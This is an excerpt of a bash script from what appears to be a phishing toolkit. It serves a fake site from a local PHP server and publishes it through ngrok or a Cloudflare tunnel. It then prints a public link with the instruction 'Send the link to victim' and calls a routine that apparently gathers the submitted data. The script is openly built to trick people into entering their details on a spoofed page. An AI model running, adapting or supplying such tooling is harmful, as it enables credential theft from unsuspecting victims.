...
getPort(){ (echo >/dev/tcp/127.0.0.1/$1) &>/dev/null && return 0 || return 1 ;}

while getPort $LPORT; do 
  LPORT=$((LPORT + 1))
done
...
printf "\e[0m\e[91m [\e[0m06\e[0m\e[91m]\e[0m\e[93m Cloudflared\e[0m\n"
printf "\e[0m\n"
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:$LPORT \e[0m\e[1;92m)\e[0m\n"
cd .htr/www && php -S 127.0.0.1:$LPORT > /dev/null 2>&1 & 
sleep 2
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:$LPORT\e[0m\n"
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$LPORT\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:$LPORT > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|cut -d '"' -f18)
...
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Cloudflared ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 2
cloudflared tunnel --url 127.0.0.1:$LPORT --logfile logs/$website.link.log > /dev/null 2>&1 &
sleep 7
cloudflared_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "logs/$website.link.log")

smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $cloudflared_link
rm logs/$website.link.log
datafound
}
